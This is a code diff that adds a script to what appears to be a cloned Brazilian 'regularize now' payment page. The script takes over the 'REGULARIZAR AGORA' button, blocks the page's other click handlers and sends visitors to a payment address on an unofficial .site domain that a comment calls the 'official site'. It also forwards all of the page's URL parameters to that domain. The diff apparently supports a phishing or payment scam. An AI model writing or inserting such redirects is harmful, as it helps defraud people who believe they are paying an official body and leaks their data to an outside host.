@@ -728,5 +728,40 @@
       });
     </script>
   <script defer="" src="../../beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015-7" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"a85dcd35d0ac4aa4b520758cac699320","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+
+  <!-- Bloco adicionado: redireciona o botão REGULARIZAR AGORA para o site oficial com os parâmetros da URL -->
+  <script>
+    (function () {
+      var OFFICIAL_URL = "https://pay.pmconcurso.site/lqv130yWJVLZxbj";
+      function withForwardedParams(baseUrl) {
+        try {
+          var target = new URL(baseUrl, window.location.href);
+          var current = new URL(window.location.href);
+          current.searchParams.forEach(function (value, key) {
+            if (!target.searchParams.has(key)) {
+              target.searchParams.append(key, value);
+            }
+          });
+          if (!target.hash && current.hash) target.hash = current.hash;
+          return target.toString();
+        } catch (e) {
+          return baseUrl;
+        }
+      }
+      var btn = document.getElementById("btn-pagar");
+      if (btn) {
+        btn.addEventListener(
+          "click",
+          function (e) {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            e.stopPropagation();
+            window.location.href = withForwardedParams(OFFICIAL_URL);
+          },
+          true
+        );
+      }
+    })();
+  </script>
 </body>
 </html>
